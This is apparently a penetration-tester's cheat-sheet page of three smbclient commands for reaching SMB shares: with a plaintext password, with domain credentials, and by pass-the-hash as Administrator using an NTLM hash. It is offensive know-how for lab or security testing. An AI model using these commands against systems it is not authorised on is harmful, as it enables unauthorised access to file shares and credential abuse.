# SMBCLIENT



{% tabs %}
{% tab title="List using credentials" %}
```bash
smbclient -L \\\\<ip-addr>\\secrets -p 4455 -U hr_admin --password="Welcome1234"
```
{% endtab %}

{% tab title="Authenticate using domain creds" %}
```bash
smbclient \\<ip-addr>\sharing\ -U 'corp.com/mike%password'
```
{% endtab %}

{% tab title="Pass-the-Hash" %}
```bash
smbclient \\<ip-addr>\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```
{% endtab %}
{% endtabs %}

